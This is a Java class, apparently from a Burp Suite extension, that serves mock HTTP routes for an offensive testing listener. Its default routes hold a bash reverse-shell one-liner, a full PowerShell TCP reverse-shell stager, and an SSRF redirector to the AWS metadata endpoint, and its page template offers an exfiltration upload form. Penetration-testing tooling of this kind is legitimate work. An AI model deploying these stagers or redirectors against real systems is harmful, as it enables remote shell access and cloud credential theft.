package burp.listener;

import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * Advanced configuration and builder for dynamic HTTP webhook responses,
 * mock route routing, auto-hosted payload stagers, and SSRF redirectors.
 */
public class WebhookResponseConfig {

    private String statusCode = "200 OK";
    private String contentType = "text/html; charset=utf-8";
    private String responseBody;
    private boolean enableCors = true;
    private String redirectLocation = "https://example.com";

    // Mock Route Manager
    private final List<MockRoute> mockRoutes = new ArrayList<>();

    public WebhookResponseConfig() {
        this.responseBody = getDefaultHtmlTemplate();
        initDefaultRoutes();
    }

    private void initDefaultRoutes() {
        mockRoutes.add(new MockRoute(
                "/redirect",
                MockRoute.MatchType.EXACT,
                "302 Found",
                "text/html; charset=utf-8",
                "Redirecting to AWS Metadata...",
                "http://169.254.169.254/latest/meta-data/",
                "Cloud Metadata SSRF Redirector"
        ));

        mockRoutes.add(new MockRoute(
                "/aws-meta",
                MockRoute.MatchType.EXACT,
                "200 OK",
                "application/json; charset=utf-8",
                "{\n  \"instanceId\": \"i-08a7b9c1d2e3f4g5h\",\n  \"amiId\": \"ami-0123456789abcdef0\",\n  \"instanceType\": \"t3.medium\",\n  \"region\": \"us-east-1\",\n  \"securityGroups\": [\"sg-default-app\"]\n}",
                "",
                "Mock AWS Metadata Response"
        ));

        mockRoutes.add(new MockRoute(
                "/payload",
                MockRoute.MatchType.EXACT,
                "200 OK",
                "text/plain; charset=utf-8",
                "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
                "",
                "Auto-Hosted Active Stager Payload"
        ));

        mockRoutes.add(new MockRoute(
                "/rev.ps1",
                MockRoute.MatchType.EXACT,
                "200 OK",
                "text/plain; charset=utf-8",
                "$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
                "",
                "PowerShell IEX Stager Payload"
        ));
    }

    public synchronized void autoHostPayload(String scriptContent, String filename) {
        // Update /payload
        MockRoute payloadRoute = findRouteByPath("/payload");
        if (payloadRoute != null) {
            payloadRoute.setResponseBody(scriptContent);
            payloadRoute.setEnabled(true);
        } else {
            mockRoutes.add(new MockRoute("/payload", MockRoute.MatchType.EXACT, "200 OK", "text/plain; charset=utf-8", scriptContent, "", "Auto-Hosted Payload"));
        }

        // If filename provided (e.g. rev.ps1 or shell.sh)
        if (filename != null && !filename.trim().isEmpty()) {
            String routePath = filename.startsWith("/") ? filename : "/" + filename;
            MockRoute namedRoute = findRouteByPath(routePath);
            if (namedRoute != null) {
                namedRoute.setResponseBody(scriptContent);
                namedRoute.setEnabled(true);
            } else {
                mockRoutes.add(new MockRoute(routePath, MockRoute.MatchType.EXACT, "200 OK", "text/plain; charset=utf-8", scriptContent, "", "Auto-Hosted " + filename));
            }
        }
    }

    public synchronized MockRoute findMatchingRoute(String requestPath) {
        if (requestPath == null) return null;
        for (MockRoute r : mockRoutes) {
            if (r.matches(requestPath)) {
                return r;
            }
        }
        return null;
    }

    public synchronized MockRoute findRouteByPath(String path) {
        for (MockRoute r : mockRoutes) {
            if (r.getPath().equalsIgnoreCase(path)) {
                return r;
            }
        }
        return null;
    }

    public synchronized List<MockRoute> getMockRoutes() {
        return Collections.unmodifiableList(new ArrayList<>(mockRoutes));
    }

    public synchronized void addMockRoute(MockRoute route) {
        mockRoutes.add(route);
    }

    public synchronized void removeMockRoute(MockRoute route) {
        mockRoutes.remove(route);
    }

    /**
     * Builds the complete raw HTTP response byte array with dynamic telemetry,
     * query parameter override support, and mock routing.
     */
    public byte[] buildResponseBytes(String clientIp, String method, String path, int port, String rawHeaders, int contentLength) {
        String reqPath = path != null ? path : "/";

        // 1. Check for Query Parameter Override (e.g., /?status=302&location=... or /?status=401)
        Map<String, String> queryParams = parseQueryParams(reqPath);
        if (queryParams.containsKey("status") || queryParams.containsKey("location") || queryParams.containsKey("body")) {
            return buildDynamicOverrideResponse(queryParams, clientIp, port);
        }

        // 2. Check for Custom Mock Route Match
        MockRoute matchedRoute = findMatchingRoute(reqPath);
        if (matchedRoute != null) {
            return matchedRoute.buildResponseBytes(enableCors);
        }

        // 3. Render Standard High-Tech Telemetry Response
        String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
        String formattedBody = responseBody != null ? responseBody : "";
        formattedBody = formattedBody.replace("{{client_ip}}", escapeHtml(clientIp != null ? clientIp : "127.0.0.1"))
                .replace("{{method}}", escapeHtml(method != null ? method : "GET"))
                .replace("{{path}}", escapeHtml(reqPath))
                .replace("{{port}}", escapeHtml(String.valueOf(port)))
                .replace("{{timestamp}}", escapeHtml(timestamp))
                .replace("{{content_length}}", escapeHtml(String.valueOf(contentLength)))
                .replace("{{headers}}", escapeHtml(rawHeaders != null && !rawHeaders.trim().isEmpty() ? rawHeaders.trim() : "No headers captured."));

        byte[] bodyBytes = formattedBody.getBytes(StandardCharsets.UTF_8);

        StringBuilder headerBuilder = new StringBuilder();
        headerBuilder.append("HTTP/1.1 ").append(statusCode).append("\r\n");
        headerBuilder.append("Server: ReverseShellReceiver/2.0\r\n");
        headerBuilder.append("Content-Type: ").append(contentType).append("\r\n");
        headerBuilder.append("Content-Length: ").append(bodyBytes.length).append("\r\n");
        headerBuilder.append("Connection: close\r\n");

        if (enableCors) {
            headerBuilder.append("Access-Control-Allow-Origin: *\r\n");
            headerBuilder.append("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS, HEAD\r\n");
            headerBuilder.append("Access-Control-Allow-Headers: *\r\n");
            headerBuilder.append("Access-Control-Expose-Headers: *\r\n");
        }

        if (statusCode.startsWith("301") || statusCode.startsWith("302") || statusCode.startsWith("307") || statusCode.startsWith("308")) {
            String sanitizedRedirect = redirectLocation != null ? redirectLocation.replaceAll("[\r\n]", "") : "";
            headerBuilder.append("Location: ").append(sanitizedRedirect).append("\r\n");
        }

        headerBuilder.append("\r\n");

        byte[] headerBytes = headerBuilder.toString().getBytes(StandardCharsets.UTF_8);
        byte[] fullResponse = new byte[headerBytes.length + bodyBytes.length];
        System.arraycopy(headerBytes, 0, fullResponse, 0, headerBytes.length);
        System.arraycopy(bodyBytes, 0, fullResponse, headerBytes.length, bodyBytes.length);

        return fullResponse;
    }

    private Map<String, String> parseQueryParams(String path) {
        Map<String, String> map = new HashMap<>();
        if (path == null || !path.contains("?")) return map;

        String query = path.substring(path.indexOf("?") + 1);
        String[] pairs = query.split("&");
        for (String pair : pairs) {
            String[] kv = pair.split("=", 2);
            if (kv.length == 2) {
                try {
                    String k = URLDecoder.decode(kv[0], "UTF-8").toLowerCase();
                    String v = URLDecoder.decode(kv[1], "UTF-8");
                    map.put(k, v);
                } catch (Exception ignored) {}
            }
        }
        return map;
    }

    private byte[] buildDynamicOverrideResponse(Map<String, String> params, String clientIp, int port) {
        String dynStatus = params.getOrDefault("status", statusCode);
        if (dynStatus.matches("^\\d+$")) {
            dynStatus = dynStatus + " Custom";
        }
        String dynContentType = params.getOrDefault("type", contentType);
        String dynLocation = params.get("location");
        if (dynLocation != null) {
            dynLocation = dynLocation.replaceAll("[\r\n]", "");
        }
        String dynBody = params.getOrDefault("body", "Dynamic response dispatched to client " + clientIp);

        byte[] bodyBytes = dynBody.getBytes(StandardCharsets.UTF_8);
        StringBuilder headerBuilder = new StringBuilder();
        headerBuilder.append("HTTP/1.1 ").append(dynStatus).append("\r\n");
        headerBuilder.append("Server: ReverseShellReceiver-Override/2.0\r\n");
        headerBuilder.append("Content-Type: ").append(dynContentType).append("\r\n");
        headerBuilder.append("Content-Length: ").append(bodyBytes.length).append("\r\n");
        headerBuilder.append("Connection: close\r\n");

        if (enableCors) {
            headerBuilder.append("Access-Control-Allow-Origin: *\r\n");
            headerBuilder.append("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS, HEAD\r\n");
            headerBuilder.append("Access-Control-Allow-Headers: *\r\n");
        }

        if (dynLocation != null && !dynLocation.isEmpty()) {
            headerBuilder.append("Location: ").append(dynLocation).append("\r\n");
        }

        headerBuilder.append("\r\n");

        byte[] headerBytes = headerBuilder.toString().getBytes(StandardCharsets.UTF_8);
        byte[] fullResponse = new byte[headerBytes.length + bodyBytes.length];
        System.arraycopy(headerBytes, 0, fullResponse, 0, headerBytes.length);
        System.arraycopy(bodyBytes, 0, fullResponse, headerBytes.length, bodyBytes.length);

        return fullResponse;
    }

    public static String escapeHtml(String input) {
        if (input == null) return "";
        StringBuilder out = new StringBuilder(Math.max(16, input.length()));
        for (int i = 0; i < input.length(); i++) {
            char c = input.charAt(i);
            switch (c) {
                case '&':  out.append("&amp;"); break;
                case '<':  out.append("&lt;"); break;
                case '>':  out.append("&gt;"); break;
                case '"':  out.append("&quot;"); break;
                case '\'': out.append("&#x27;"); break;
                default:   out.append(c); break;
            }
        }
        return out.toString();
    }

    public byte[] buildResponseBytes() {
        return buildResponseBytes("127.0.0.1", "GET", "/", 8080, "Host: localhost", 0);
    }

    // Getters and Setters
    public String getStatusCode() { return statusCode; }
    public void setStatusCode(String statusCode) { this.statusCode = statusCode; }

    public String getContentType() { return contentType; }
    public void setContentType(String contentType) { this.contentType = contentType; }

    public String getResponseBody() { return responseBody; }
    public void setResponseBody(String responseBody) { this.responseBody = responseBody; }

    public boolean isEnableCors() { return enableCors; }
    public void setEnableCors(boolean enableCors) { this.enableCors = enableCors; }

    public String getRedirectLocation() { return redirectLocation; }
    public void setRedirectLocation(String redirectLocation) { this.redirectLocation = redirectLocation; }

    /**
     * Generates a sleek, luxury, modern dark-themed HTML page with interactive dropzone and live telemetry.
     * Strictly free of any icons or emojis.
     */
    public static String getDefaultHtmlTemplate() {
        return "<!DOCTYPE html>\n" +
                "<html lang=\"en\">\n" +
                "<head>\n" +
                "<meta charset=\"UTF-8\">\n" +
                "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n" +
                "<title>Reverse Shell Receiver | Ready for Interaction</title>\n" +
                "<style>\n" +
                "  :root {\n" +
                "    --bg-main: #0a0e17;\n" +
                "    --bg-card: #111827;\n" +
                "    --bg-card-header: #1a2234;\n" +
                "    --border-card: #1f293d;\n" +
                "    --text-primary: #f8fafc;\n" +
                "    --text-secondary: #94a3b8;\n" +
                "    --text-muted: #64748b;\n" +
                "    --accent-emerald: #10b981;\n" +
                "    --accent-cyan: #06b6d4;\n" +
                "    --accent-blue: #3b82f6;\n" +
                "    --font-sans: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, \"Helvetica Neue\", Arial, sans-serif;\n" +
                "    --font-mono: \"Consolas\", \"Menlo\", \"Monaco\", \"Cascadia Code\", \"Courier New\", monospace;\n" +
                "  }\n" +
                "  * { box-sizing: border-box; margin: 0; padding: 0; }\n" +
                "  body {\n" +
                "    background-color: var(--bg-main);\n" +
                "    color: var(--text-primary);\n" +
                "    font-family: var(--font-sans);\n" +
                "    line-height: 1.5;\n" +
                "    padding: 36px 20px;\n" +
                "    display: flex;\n" +
                "    justify-content: center;\n" +
                "    align-items: flex-start;\n" +
                "    min-height: 100vh;\n" +
                "  }\n" +
                "  .container {\n" +
                "    max-width: 900px;\n" +
                "    width: 100%;\n" +
                "    display: flex;\n" +
                "    flex-direction: column;\n" +
                "    gap: 18px;\n" +
                "  }\n" +
                "  .header-card {\n" +
                "    background: linear-gradient(135deg, #111827 0%, #1e293b 100%);\n" +
                "    border: 1px solid var(--border-card);\n" +
                "    border-top: 3px solid var(--accent-emerald);\n" +
                "    border-radius: 8px;\n" +
                "    padding: 22px 26px;\n" +
                "    display: flex;\n" +
                "    justify-content: space-between;\n" +
                "    align-items: center;\n" +
                "    flex-wrap: wrap;\n" +
                "    gap: 14px;\n" +
                "  }\n" +
                "  .header-title-group h1 {\n" +
                "    font-size: 19px;\n" +
                "    font-weight: 700;\n" +
                "    letter-spacing: 0.5px;\n" +
                "    color: #ffffff;\n" +
                "    margin-bottom: 3px;\n" +
                "  }\n" +
                "  .header-title-group p {\n" +
                "    font-size: 11px;\n" +
                "    color: var(--text-secondary);\n" +
                "    letter-spacing: 0.4px;\n" +
                "    text-transform: uppercase;\n" +
                "  }\n" +
                "  .status-badge {\n" +
                "    display: inline-flex;\n" +
                "    align-items: center;\n" +
                "    gap: 8px;\n" +
                "    background: rgba(16, 185, 129, 0.12);\n" +
                "    border: 1px solid rgba(16, 185, 129, 0.35);\n" +
                "    color: var(--accent-emerald);\n" +
                "    font-family: var(--font-mono);\n" +
                "    font-size: 11px;\n" +
                "    font-weight: 700;\n" +
                "    padding: 6px 14px;\n" +
                "    border-radius: 20px;\n" +
                "    letter-spacing: 0.5px;\n" +
                "  }\n" +
                "  .status-dot {\n" +
                "    width: 7px;\n" +
                "    height: 7px;\n" +
                "    background-color: var(--accent-emerald);\n" +
                "    border-radius: 50%;\n" +
                "    box-shadow: 0 0 8px var(--accent-emerald);\n" +
                "  }\n" +
                "  .grid-2 {\n" +
                "    display: grid;\n" +
                "    grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));\n" +
                "    gap: 16px;\n" +
                "  }\n" +
                "  .card {\n" +
                "    background-color: var(--bg-card);\n" +
                "    border: 1px solid var(--border-card);\n" +
                "    border-radius: 8px;\n" +
                "    overflow: hidden;\n" +
                "  }\n" +
                "  .card-header {\n" +
                "    background-color: var(--bg-card-header);\n" +
                "    border-bottom: 1px solid var(--border-card);\n" +
                "    padding: 10px 16px;\n" +
                "    font-size: 11px;\n" +
                "    font-weight: 700;\n" +
                "    letter-spacing: 0.6px;\n" +
                "    color: var(--text-secondary);\n" +
                "    text-transform: uppercase;\n" +
                "  }\n" +
                "  .card-body {\n" +
                "    padding: 14px 16px;\n" +
                "  }\n" +
                "  .data-list {\n" +
                "    display: flex;\n" +
                "    flex-direction: column;\n" +
                "    gap: 9px;\n" +
                "  }\n" +
                "  .data-row {\n" +
                "    display: flex;\n" +
                "    justify-content: space-between;\n" +
                "    align-items: center;\n" +
                "    padding-bottom: 7px;\n" +
                "    border-bottom: 1px solid rgba(255, 255, 255, 0.04);\n" +
                "    font-size: 12px;\n" +
                "  }\n" +
                "  .data-row:last-child {\n" +
                "    border-bottom: none;\n" +
                "    padding-bottom: 0;\n" +
                "  }\n" +
                "  .data-label {\n" +
                "    color: var(--text-muted);\n" +
                "    font-weight: 500;\n" +
                "    text-transform: uppercase;\n" +
                "    font-size: 11px;\n" +
                "    letter-spacing: 0.3px;\n" +
                "  }\n" +
                "  .data-value {\n" +
                "    color: var(--text-primary);\n" +
                "    font-family: var(--font-mono);\n" +
                "    font-weight: 600;\n" +
                "  }\n" +
                "  .pill-method {\n" +
                "    background: rgba(6, 182, 212, 0.15);\n" +
                "    border: 1px solid rgba(6, 182, 212, 0.35);\n" +
                "    color: var(--accent-cyan);\n" +
                "    padding: 2px 8px;\n" +
                "    border-radius: 4px;\n" +
                "    font-size: 11px;\n" +
                "  }\n" +
                "  .headers-box {\n" +
                "    background: #080c14;\n" +
                "    border: 1px solid var(--border-card);\n" +
                "    border-radius: 6px;\n" +
                "    padding: 12px;\n" +
                "    font-family: var(--font-mono);\n" +
                "    font-size: 11px;\n" +
                "    color: #cbd5e1;\n" +
                "    white-space: pre-wrap;\n" +
                "    word-break: break-all;\n" +
                "    max-height: 150px;\n" +
                "    overflow-y: auto;\n" +
                "    line-height: 1.5;\n" +
                "  }\n" +
                "  .dropzone-box {\n" +
                "    border: 2px dashed #334155;\n" +
                "    border-radius: 6px;\n" +
                "    padding: 16px;\n" +
                "    text-align: center;\n" +
                "    background: rgba(15, 23, 42, 0.5);\n" +
                "  }\n" +
                "  .dropzone-box p { font-size: 12px; color: var(--text-secondary); margin-bottom: 8px; }\n" +
                "  .btn-upload {\n" +
                "    background: #2563eb;\n" +
                "    color: #ffffff;\n" +
                "    border: none;\n" +
                "    padding: 6px 14px;\n" +
                "    font-size: 11px;\n" +
                "    font-weight: 700;\n" +
                "    border-radius: 4px;\n" +
                "    cursor: pointer;\n" +
                "  }\n" +
                "  .btn-upload:hover { background: #1d4ed8; }\n" +
                "  .footer-card {\n" +
                "    display: flex;\n" +
                "    justify-content: space-between;\n" +
                "    align-items: center;\n" +
                "    padding: 10px 14px;\n" +
                "    font-size: 11px;\n" +
                "    color: var(--text-muted);\n" +
                "    letter-spacing: 0.3px;\n" +
                "    flex-wrap: wrap;\n" +
                "    gap: 8px;\n" +
                "  }\n" +
                "</style>\n" +
                "</head>\n" +
                "<body>\n" +
                "<div class=\"container\">\n" +
                "  <div class=\"header-card\">\n" +
                "    <div class=\"header-title-group\">\n" +
                "      <h1>Reverse Shell Receiver</h1>\n" +
                "      <p>Out-of-Band Application Security Testing (OAST) Endpoint</p>\n" +
                "    </div>\n" +
                "    <div class=\"status-badge\">\n" +
                "      <div class=\"status-dot\"></div>\n" +
                "      <span>READY FOR INTERACTION</span>\n" +
                "    </div>\n" +
                "  </div>\n" +
                "\n" +
                "  <div class=\"grid-2\">\n" +
                "    <div class=\"card\">\n" +
                "      <div class=\"card-header\">Inbound Transaction Telemetry</div>\n" +
                "      <div class=\"card-body\">\n" +
                "        <div class=\"data-list\">\n" +
                "          <div class=\"data-row\">\n" +
                "            <span class=\"data-label\">Client IP Address</span>\n" +
                "            <span class=\"data-value\">{{client_ip}}</span>\n" +
                "          </div>\n" +
                "          <div class=\"data-row\">\n" +
                "            <span class=\"data-label\">HTTP Method</span>\n" +
                "            <span class=\"data-value\"><span class=\"pill-method\">{{method}}</span></span>\n" +
                "          </div>\n" +
                "          <div class=\"data-row\">\n" +
                "            <span class=\"data-label\">Target Path</span>\n" +
                "            <span class=\"data-value\">{{path}}</span>\n" +
                "          </div>\n" +
                "          <div class=\"data-row\">\n" +
                "            <span class=\"data-label\">Server Port</span>\n" +
                "            <span class=\"data-value\">{{port}}</span>\n" +
                "          </div>\n" +
                "          <div class=\"data-row\">\n" +
                "            <span class=\"data-label\">Timestamp</span>\n" +
                "            <span class=\"data-value\">{{timestamp}}</span>\n" +
                "          </div>\n" +
                "          <div class=\"data-row\">\n" +
                "            <span class=\"data-label\">Body Payload Size</span>\n" +
                "            <span class=\"data-value\">{{content_length}} Bytes</span>\n" +
                "          </div>\n" +
                "        </div>\n" +
                "      </div>\n" +
                "    </div>\n" +
                "\n" +
                "    <div class=\"card\">\n" +
                "      <div class=\"card-header\">Receiver Capabilities & Policies</div>\n" +
                "      <div class=\"card-body\">\n" +
                "        <div class=\"data-list\">\n" +
                "          <div class=\"data-row\">\n" +
                "            <span class=\"data-label\">CORS Policy</span>\n" +
                "            <span class=\"data-value\" style=\"color: var(--accent-emerald);\">Access-Control-Allow-Origin: *</span>\n" +
                "          </div>\n" +
                "          <div class=\"data-row\">\n" +
                "            <span class=\"data-label\">Mock Routes & Stagers</span>\n" +
                "            <span class=\"data-value\">Dynamic Path Router Active</span>\n" +
                "          </div>\n" +
                "          <div class=\"data-row\">\n" +
                "            <span class=\"data-label\">DoS Buffer Safeguard</span>\n" +
                "            <span class=\"data-value\">10 MB Content-Length Clamping</span>\n" +
                "          </div>\n" +
                "          <div class=\"data-row\">\n" +
                "            <span class=\"data-label\">Query Parameter Override</span>\n" +
                "            <span class=\"data-value\">?status=... & ?location=...</span>\n" +
                "          </div>\n" +
                "          <div class=\"data-row\">\n" +
                "            <span class=\"data-label\">Assessment Mode</span>\n" +
                "            <span class=\"data-value\" style=\"color: var(--accent-cyan);\">Active Security Testing</span>\n" +
                "          </div>\n" +
                "        </div>\n" +
                "      </div>\n" +
                "    </div>\n" +
                "  </div>\n" +
                "\n" +
                "  <div class=\"grid-2\">\n" +
                "    <div class=\"card\">\n" +
                "      <div class=\"card-header\">Captured Request Headers</div>\n" +
                "      <div class=\"card-body\">\n" +
                "        <div class=\"headers-box\">{{headers}}</div>\n" +
                "      </div>\n" +
                "    </div>\n" +
                "    <div class=\"card\">\n" +
                "      <div class=\"card-header\">Data Exfiltration Dropzone</div>\n" +
                "      <div class=\"card-body\">\n" +
                "        <div class=\"dropzone-box\">\n" +
                "          <form action=\"/exfil\" method=\"POST\" enctype=\"multipart/form-data\">\n" +
                "            <p>POST File or String Data to /exfil</p>\n" +
                "            <input type=\"file\" name=\"file\" style=\"margin-bottom: 10px; font-size: 11px;\"><br>\n" +
                "            <button type=\"submit\" class=\"btn-upload\">SEND TEST PAYLOAD</button>\n" +
                "          </form>\n" +
                "        </div>\n" +
                "      </div>\n" +
                "    </div>\n" +
                "  </div>\n" +
                "\n" +
                "  <div class=\"footer-card\">\n" +
                "    <span>Reverse Shell Receiver v2.0 &bull; Burp Suite Extension</span>\n" +
                "    <span>Authorized Security Assessment &bull; Logging Active</span>\n" +
                "  </div>\n" +
                "</div>\n" +
                "</body>\n" +
                "</html>";
    }
}
